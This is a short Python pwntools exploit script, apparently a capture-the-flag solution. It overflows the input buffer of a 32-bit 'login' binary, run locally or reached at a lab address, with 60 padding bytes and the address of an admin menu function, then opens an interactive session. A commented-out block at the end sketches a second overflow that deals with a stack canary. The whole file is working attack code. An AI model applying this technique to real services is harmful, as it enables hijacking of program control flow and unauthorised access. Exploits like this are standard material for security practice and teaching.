#!/usr/bin/python2
# -*- coding: utf-8 -*-

from pwn import *
context(arch='i386')
rem = False
if rem:
	io = remote('10.0.10.1', 31337)	
else:
	io = process('./login')

admin_menu_addr = 0x08048581

io.recvline()

#io.sendline('A'*60 + "\x81\x85\x04\x08")
io.sendline('A'*60 + p32(admin_menu_addr))






io.interactive()

'''

s = io.recvuntil("")


s = io.recvline()

io.sendline(fit({32: p32(canary), 48: p32(0x08048a8c)})) #buffer overflow!

io.interactive()'''